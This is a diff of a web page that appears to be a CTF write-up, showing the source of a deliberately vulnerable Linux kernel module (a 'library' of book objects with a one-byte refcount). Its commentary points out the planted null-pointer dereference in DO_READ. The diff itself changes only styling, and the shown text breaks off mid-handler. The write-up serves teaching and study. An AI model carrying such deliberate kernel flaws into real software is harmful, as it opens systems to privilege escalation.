@@ -113,7 +113,7 @@
 <h4 id="module-functionality">Module Functionality</h4>
 <p><img src="/images/dead-pwners-society/dead-pwners-society.jpg" alt="Challenge description"></p>
 <p>The source code was provided to players. The module had 6 functions: DO_CREATE, DO_DELETE, DO_BORROW, DO_READ, DO_NOTE, and DO_RETURN. As the kernel module was supposed to be a library, all the functions operate on struct book objects (size 256):</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> book {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> book {
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">0x40</span>];
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> idx;
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> list_head book_list; 
@@ -124,7 +124,7 @@
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> info[<span style="color:#ae81ff">0x79</span>];
 </span></span><span style="display:flex;"><span>}; 
 </span></span></code></pre></div><p>struct book objects all had a one byte refcount value, which could be modified with the reference_init, reference_get and reference_put functions.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> reference {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> reference {
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint8_t</span> val;
 </span></span><span style="display:flex;"><span>};
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">reference_init</span>(<span style="color:#66d9ef">struct</span> reference <span style="color:#f92672">*</span>ref) {
@@ -143,7 +143,7 @@
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>There were also two linked lists keeping track of the book objects, namely book_list for all book objects, and loan_list for book objects that have been borrowed at least once.</p>
 <p>Finally, the user can interact with the module via ioctl, which takes in the following struct:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> req {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> req {
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> idx;
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> name_addr;
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> note_size;
@@ -151,43 +151,43 @@
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> info_addr;
 </span></span><span style="display:flex;"><span>};
 </span></span></code></pre></div><p><strong>DO_CREATE: 0xc028ca00</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> DO_CREATE: { 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> DO_CREATE: { 
 </span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Lock the mutex
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#a6e22e">mutex_lock</span>(<span style="color:#f92672">&amp;</span>book_mutex);
+</span></span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">mutex_lock</span>(<span style="color:#f92672">&amp;</span>book_mutex);
 </span></span><span style="display:flex;"><span>            
 </span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Create the book object and set idx
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            book <span style="color:#f92672">=</span> <span style="color:#a6e22e">kzalloc</span>(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> book), GFP_KERNEL); 
+</span></span></span><span style="display:flex;"><span>            book <span style="color:#f92672">=</span> <span style="color:#a6e22e">kzalloc</span>(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> book), GFP_KERNEL); 
 </span></span><span style="display:flex;"><span>            book<span style="color:#f92672">-&gt;</span>idx <span style="color:#f92672">=</span> book_count; 
 </span></span><span style="display:flex;"><span>            book_count <span style="color:#f92672">=</span> book_count <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
 </span></span><span style="display:flex;"><span>            
 </span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Copy name into the book object
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">copy_from_user</span>(buf, (<span style="color:#66d9ef">void</span> __user <span style="color:#f92672">*</span>) user_data.name_addr, <span style="color:#ae81ff">0x40</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span></span><span style="display:flex;"><span>            ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">copy_from_user</span>(buf, (<span style="color:#66d9ef">void</span> __user <span style="color:#f92672">*</span>) user_data.name_addr, <span style="color:#ae81ff">0x40</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
 </span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">memcpy</span>(<span style="color:#f92672">&amp;</span>book<span style="color:#f92672">-&gt;</span>name, buf, <span style="color:#ae81ff">0x40</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>); 
 </span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">memset</span>(buf, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(buf));
 </span></span><span style="display:flex;"><span>            
 </span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Copy info into the book object
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">copy_from_user</span>(buf, (<span style="color:#66d9ef">void</span> __user <span style="color:#f92672">*</span>) user_data.info_addr, <span style="color:#ae81ff">0x79</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span></span><span style="display:flex;"><span>            ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">copy_from_user</span>(buf, (<span style="color:#66d9ef">void</span> __user <span style="color:#f92672">*</span>) user_data.info_addr, <span style="color:#ae81ff">0x79</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
 </span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">memcpy</span>(<span style="color:#f92672">&amp;</span>book<span style="color:#f92672">-&gt;</span>info, buf, <span style="color:#ae81ff">0x79</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
 </span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">memset</span>(buf, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(buf));
 </span></span><span style="display:flex;"><span>            
 </span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Create the note 
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            book<span style="color:#f92672">-&gt;</span>note_size <span style="color:#f92672">=</span> user_data.note_size; 
+</span></span></span><span style="display:flex;"><span>            book<span style="color:#f92672">-&gt;</span>note_size <span style="color:#f92672">=</span> user_data.note_size; 
 </span></span><span style="display:flex;"><span>            note <span style="color:#f92672">=</span> <span style="color:#a6e22e">kzalloc</span>(book<span style="color:#f92672">-&gt;</span>note_size, GFP_KERNEL); <span style="color:#75715e">// If this fails, it will return 0 or ZERO_SIZE_PTR = 0x10
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">if</span> ((note <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&amp;&amp;</span> ((<span style="color:#66d9ef">uint64_t</span>) note <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x10</span>)) { 
+</span></span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ((note <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&amp;&amp;</span> ((<span style="color:#66d9ef">uint64_t</span>) note <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x10</span>)) { 
 </span></span><span style="display:flex;"><span>                ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">copy_from_user</span>(buf, (<span style="color:#66d9ef">void</span> __user <span style="color:#f92672">*</span>) user_data.note_addr, book<span style="color:#f92672">-&gt;</span>note_size<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
 </span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">memcpy</span>((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) note, buf, book<span style="color:#f92672">-&gt;</span>note_size<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>); 
 </span></span><span style="display:flex;"><span>                book<span style="color:#f92672">-&gt;</span>note_addr <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span>) note;
 </span></span><span style="display:flex;"><span>            }
 </span></span><span style="display:flex;"><span>            
 </span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Initialize the refcount 
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#a6e22e">reference_init</span>(<span style="color:#f92672">&amp;</span>book<span style="color:#f92672">-&gt;</span>ref); 
+</span></span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">reference_init</span>(<span style="color:#f92672">&amp;</span>book<span style="color:#f92672">-&gt;</span>ref); 
 </span></span><span style="display:flex;"><span>            
 </span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Add the book object to book_list
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#a6e22e">list_add_tail</span>(<span style="color:#f92672">&amp;</span>book<span style="color:#f92672">-&gt;</span>book_list, <span style="color:#f92672">&amp;</span>book_head);
+</span></span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">list_add_tail</span>(<span style="color:#f92672">&amp;</span>book<span style="color:#f92672">-&gt;</span>book_list, <span style="color:#f92672">&amp;</span>book_head);
 </span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">pr_info</span>(<span style="color:#e6db74">&#34;Created book at index %lld</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, book<span style="color:#f92672">-&gt;</span>idx);
 </span></span><span style="display:flex;"><span>            
 </span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Unlock the mutex and return
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>book_mutex);
+</span></span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>book_mutex);
 </span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>; 
 </span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
 </span></span><span style="display:flex;"><span>        }
@@ -195,52 +195,52 @@
 <p>However, it is possible for kzalloc to fail. If the size specified by the user is 0, kzalloc will return ZERO_SIZE_PTR (0x10). In that case, note_addr would remain 0 &ndash; keep this in mind for now.</p>
 <p>The refcount of the book object is then initialized to 1. Finally, the book object is added to book_list.</p>
 <p><strong>DO_DELETE: 0xc028ca01</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> DO_DELETE: {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> DO_DELETE: {
 </span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Lock the mutex
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#a6e22e">mutex_lock</span>(<span style="color:#f92672">&amp;</span>book_mutex);
+</span></span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">mutex_lock</span>(<span style="color:#f92672">&amp;</span>book_mutex);
 </span></span><span style="display:flex;"><span>            
 </span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">list_for_each</span>(ptr, <span style="color:#f92672">&amp;</span>book_head) {
 </span></span><span style="display:flex;"><span>                entry <span style="color:#f92672">=</span> <span style="color:#a6e22e">list_entry</span>(ptr, <span style="color:#66d9ef">struct</span> book, book_list);
 </span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (entry<span style="color:#f92672">-&gt;</span>idx <span style="color:#f92672">==</span> user_data.idx) {
 </span></span><span style="display:flex;"><span>                    
 </span></span><span style="display:flex;"><span>                    <span style="color:#75715e">// Check that the refcount is only one, or not fail
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    <span style="color:#66d9ef">if</span> (entry<span style="color:#f92672">-&gt;</span>ref.val <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span>) {
+</span></span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (entry<span style="color:#f92672">-&gt;</span>ref.val <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span>) {
 </span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>book_mutex);
 </span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
 </span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">break</span>;
 </span></span><span style="display:flex;"><span>                    }
 </span></span><span style="display:flex;"><span>                    
 </span></span><span style="display:flex;"><span>                    <span style="color:#75715e">// Decrease the refcount to zero
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    <span style="color:#a6e22e">reference_put</span>(<span style="color:#f92672">&amp;</span>entry<span style="color:#f92672">-&gt;</span>ref); 
+</span></span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">reference_put</span>(<span style="color:#f92672">&amp;</span>entry<span style="color:#f92672">-&gt;</span>ref); 
 </span></span><span style="display:flex;"><span>                    
 </span></span><span style="display:flex;"><span>                    <span style="color:#75715e">// Unlink it from the linked list
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    <span style="color:#a6e22e">list_del</span>(<span style="color:#f92672">&amp;</span>entry<span style="color:#f92672">-&gt;</span>book_list); 
+</span></span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">list_del</span>(<span style="color:#f92672">&amp;</span>entry<span style="color:#f92672">-&gt;</span>book_list); 
 </span></span><span style="display:flex;"><span>                    
 </span></span><span style="display:flex;"><span>                    <span style="color:#75715e">// Free the note object 
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    <span style="color:#66d9ef">if</span> (entry<span style="color:#f92672">-&gt;</span>note_addr <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) { 
+</span></span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (entry<span style="color:#f92672">-&gt;</span>note_addr <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) { 
 </span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">kfree</span>((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) entry<span style="color:#f92672">-&gt;</span>note_addr);
 </span></span><span style="display:flex;"><span>                        entry<span style="color:#f92672">-&gt;</span>note_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; 
 </span></span><span style="display:flex;"><span>                    }
 </span></span><span style="display:flex;"><span>                    
 </span></span><span style="display:flex;"><span>                    <span style="color:#75715e">// Free the book object
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    <span style="color:#a6e22e">kfree</span>(entry);
+</span></span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">kfree</span>(entry);
 </span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">pr_info</span>(<span style="color:#e6db74">&#34;Deleted book at index %lld</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, user_data.idx);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>                    <span style="color:#75715e">// Unlock the mutex
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>book_mutex);
+</span></span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>book_mutex);
 </span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
 </span></span><span style="display:flex;"><span>                }
 </span></span><span style="display:flex;"><span>            }
 </span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Failure path
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>book_mutex);
+</span></span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>book_mutex);
 </span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
 </span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
 </span></span><span style="display:flex;"><span>        }
 </span></span></code></pre></div><p>DO_DELETE is pretty simple. It checks that the refcount of a book object (idx specified by user) is equals to one (in essence making sure that the book has not been borrowed), and if so, unlinks and frees the book object and its note.</p>
 <p><strong>DO_BORROW: 0xc028ca02</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> DO_BORROW: {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> DO_BORROW: {
 </span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Lock mutexes
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#a6e22e">mutex_lock</span>(<span style="color:#f92672">&amp;</span>book_mutex);
+</span></span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">mutex_lock</span>(<span style="color:#f92672">&amp;</span>book_mutex);
 </span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">mutex_lock</span>(<span style="color:#f92672">&amp;</span>loan_mutex);
 </span></span><span style="display:flex;"><span>            
 </span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">list_for_each</span>(ptr, <span style="color:#f92672">&amp;</span>book_head) {
@@ -248,7 +248,7 @@
 </span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (entry<span style="color:#f92672">-&gt;</span>idx <span style="color:#f92672">==</span> user_data.idx) {
 </span></span><span style="display:flex;"><span>                    
 </span></span><span style="display:flex;"><span>                    <span style="color:#75715e">// Check that the refcount is greater than 0 but less than 10 
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    <span style="color:#66d9ef">if</span> ((entry<span style="color:#f92672">-&gt;</span>ref.val <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">||</span> (entry<span style="color:#f92672">-&gt;</span>ref.val <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">10</span>)) {
+</span></span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> ((entry<span style="color:#f92672">-&gt;</span>ref.val <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">||</span> (entry<span style="color:#f92672">-&gt;</span>ref.val <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">10</span>)) {
 </span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>book_mutex);
 </span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>loan_mutex);
 </span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
@@ -256,7 +256,7 @@
 </span></span><span style="display:flex;"><span>                    }
 </span></span><span style="display:flex;"><span>                    
 </span></span><span style="display:flex;"><span>                    <span style="color:#75715e">// Check if book is in loan list, if not, add it
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    <span style="color:#a6e22e">list_for_each</span>(loan_ptr, <span style="color:#f92672">&amp;</span>loan_head) {
+</span></span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">list_for_each</span>(loan_ptr, <span style="color:#f92672">&amp;</span>loan_head) {
 </span></span><span style="display:flex;"><span>                        loan_entry <span style="color:#f92672">=</span> <span style="color:#a6e22e">list_entry</span>(loan_ptr, <span style="color:#66d9ef">struct</span> book, loan_list);
 </span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">if</span> (loan_entry<span style="color:#f92672">-&gt;</span>idx <span style="color:#f92672">==</span> entry<span style="color:#f92672">-&gt;</span>idx) {
 </span></span><span style="display:flex;"><span>                            found <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>; 
@@ -269,23 +269,23 @@
 </span></span><span style="display:flex;"><span>                    }
 </span></span><span style="display:flex;"><span>                    
 </span></span><span style="display:flex;"><span>                    <span style="color:#75715e">// Increment the refcount
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    <span style="color:#a6e22e">reference_get</span>(<span style="color:#f92672">&amp;</span>entry<span style="color:#f92672">-&gt;</span>ref);
+</span></span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">reference_get</span>(<span style="color:#f92672">&amp;</span>entry<span style="color:#f92672">-&gt;</span>ref);
 </span></span><span style="display:flex;"><span>                    
 </span></span><span style="display:flex;"><span>                    <span style="color:#75715e">// Unlock the mutex
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>book_mutex);
+</span></span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>book_mutex);
 </span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>loan_mutex);
 </span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>; 
 </span></span><span style="display:flex;"><span>                }
 </span></span><span style="display:flex;"><span>            }
 </span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Failure path
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>book_mutex);
+</span></span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>book_mutex);
 </span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>loan_mutex);
 </span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
 </span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
 </span></span><span style="display:flex;"><span>        }
 </span></span></code></pre></div><p>DO_BORROW will check if a specified book object has a refcount greater than 0 but smaller than 10. If that condition is fulfilled, it will check if the book is in the loan_list; if it is not, it will be added. The refcount of the book object wowuld then be incremented. This function essentially gives us the ability to add objects from the book_list into the loan_list.</p>
 <p><strong>DO_READ: 0xc028ca03 and the Bug 🪲</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> DO_READ: {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> DO_READ: {
 </span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">list_for_each</span>(loan_ptr, <span style="color:#f92672">&amp;</span>loan_head) {
 </span></span><span style="display:flex;"><span>                loan_entry <span style="color:#f92672">=</span> <span style="color:#a6e22e">list_entry</span>(loan_ptr, <span style="color:#66d9ef">struct</span> book, loan_list);
 </span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (loan_entry<span style="color:#f92672">-&gt;</span>idx <span style="color:#f92672">==</span> user_data.idx) {
@@ -293,24 +293,24 @@
 </span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">pr_info</span>(<span style="color:#e6db74">&#34;Read book at index %lld</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, user_data.idx);
 </span></span><span style="display:flex;"><span>                    
 </span></span><span style="display:flex;"><span>                    <span style="color:#75715e">// Increase the refcount
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    <span style="color:#a6e22e">reference_get</span>(<span style="color:#f92672">&amp;</span>loan_entry<span style="color:#f92672">-&gt;</span>ref); 
+</span></span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">reference_get</span>(<span style="color:#f92672">&amp;</span>loan_entry<span style="color:#f92672">-&gt;</span>ref); 
 </span></span><span style="display:flex;"><span>                    
 </span></span><span style="display:flex;"><span>                    <span style="color:#75715e">// Copy the note -- null pointer deref here if note_addr is 0 🪲 
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    <span style="color:#a6e22e">memcpy</span>(buf, (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) loan_entry<span style="color:#f92672">-&gt;</span>note_addr, loan_entry<span style="color:#f92672">-&gt;</span>note_size<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">memcpy</span>(buf, (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) loan_entry<span style="color:#f92672">-&gt;</span>note_addr, loan_entry<span style="color:#f92672">-&gt;</span>note_size<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
 </span></span><span style="display:flex;"><span>                    ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">copy_to_user</span>((<span style="color:#66d9ef">void</span> __user <span style="color:#f92672">*</span>)user_data.note_addr, buf, loan_entry<span style="color:#f92672">-&gt;</span>note_size<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
 </span></span><span style="display:flex;"><span>                    
 </span></span><span style="display:flex;"><span>                    <span style="color:#75715e">// Copy the name 
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    <span style="color:#a6e22e">memset</span>(buf, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(buf)); 
+</span></span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">memset</span>(buf, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(buf)); 
 </span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">memcpy</span>(buf, <span style="color:#f92672">&amp;</span>loan_entry<span style="color:#f92672">-&gt;</span>name, <span style="color:#ae81ff">0x40</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
 </span></span><span style="display:flex;"><span>                    ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">copy_to_user</span>((<span style="color:#66d9ef">void</span> __user <span style="color:#f92672">*</span>)user_data.name_addr, buf, <span style="color:#ae81ff">0x40</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
 </span></span><span style="display:flex;"><span>                    
 </span></span><span style="display:flex;"><span>                    <span style="color:#75715e">// Copy the info
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    <span style="color:#a6e22e">memset</span>(buf, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(buf)); 
+</span></span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">memset</span>(buf, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(buf)); 
 </span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">memcpy</span>(buf, <span style="color:#f92672">&amp;</span>loan_entry<span style="color:#f92672">-&gt;</span>info, <span style="color:#ae81ff">0x79</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
